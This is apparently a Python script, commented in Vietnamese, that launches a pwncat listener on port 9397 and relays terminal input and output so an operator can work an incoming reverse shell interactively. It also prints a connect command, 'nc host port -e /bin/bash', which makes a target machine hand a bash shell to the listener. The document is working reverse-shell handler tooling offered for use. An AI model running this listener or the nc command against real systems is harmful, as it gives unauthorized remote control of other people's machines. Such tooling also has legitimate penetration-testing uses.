#!/usr/bin/env python3
"""
Script để chạy pwncat listener và tương tác với reverse shell trong terminal
"""
import subprocess
import time
import os
import pty
import select
import sys
import signal

def handle_pwncat_interactive(port=9397, host="0.0.0.0"):
    """Khởi động pwncat listener và tương tác với reverse shell"""
    print(f"[INFO] Starting pwncat listener on {host}:{port}...")
    
    # Tạo PTY để tương tác với terminal
    master_fd, slave_fd = pty.openpty()
    
    # Lệnh để chạy pwncat
    cmd = ["python", "-m", "pwncat", "-l", host, "-p", str(port)]
    print(f"[INFO] Running: {' '.join(cmd)}")
    
    try:
        # Khởi động pwncat process
        proc = subprocess.Popen(
            cmd,
            stdin=slave_fd,
            stdout=slave_fd,
            stderr=slave_fd,
            close_fds=True,
            preexec_fn=os.setsid  # Tạo session mới để dễ cleanup
        )
        
        # Đóng slave_fd vì nó chỉ cần cho subprocess
        os.close(slave_fd)
        
        print(f"[INFO] Pwncat started with PID: {proc.pid}")
        print(f"[INFO] Listening on {host}:{port}...")
        print(f"[INFO] Connect using: nc {host} {port} -e /bin/bash")
        
        # Thiết lập terminal để không echo và xử lý input thô
        import termios
        old_settings = termios.tcgetattr(sys.stdin.fileno())
        new_settings = termios.tcgetattr(sys.stdin.fileno())
        new_settings[3] &= ~(termios.ECHO | termios.ICANON)  # Tắt echo và canonical mode
        termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, new_settings)
        
        try:
            # Vòng lặp tương tác
            while proc.poll() is None:  # Chạy cho đến khi process chết
                # Kiểm tra input từ user hoặc output từ pwncat
                ready, _, _ = select.select([master_fd, sys.stdin.fileno()], [], [], 0.1)
                
                for fd in ready:
                    if fd == master_fd:
                        # Đọc output từ pwncat
                        try:
                            data = os.read(master_fd, 1024)
                            if data:
                                sys.stdout.buffer.write(data)
                                sys.stdout.flush()
                            else:
                                print("[INFO] Connection closed by remote")
                                return
                        except OSError as e:
                            print(f"[ERROR] Error reading from pwncat: {e}")
                            return
                            
                    elif fd == sys.stdin.fileno():
                        # Đọc input từ user
                        try:
                            data = os.read(sys.stdin.fileno(), 1024)
                            if data:
                                os.write(master_fd, data)
                        except OSError as e:
                            print(f"[ERROR] Error reading from stdin: {e}")
                            return
                
        finally:
            # Khôi phục cài đặt terminal
            termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, old_settings)
            
    except Exception as e:
        print(f"[ERROR] Exception: {e}")
        
    finally:
        # Cleanup
        try:
            os.close(master_fd)
        except:
            pass
        try:
            # Gửi SIGTERM và đợi process kết thúc
            if proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            print("[WARN] Process did not terminate gracefully, sending SIGKILL")
            proc.kill()
        except Exception as e:
            print(f"[ERROR] Cleanup error: {e}")
        
        print("[INFO] Pwncat listener stopped")

def signal_handler(sig, frame):
    """Xử lý tín hiệu Ctrl+C"""
    print("\n[INFO] Ctrl+C detected, shutting down...")
    sys.exit(0)

if __name__ == "__main__":
    # Đăng ký signal handler cho Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Chạy pwncat listener
    handle_pwncat_interactive(port=9397)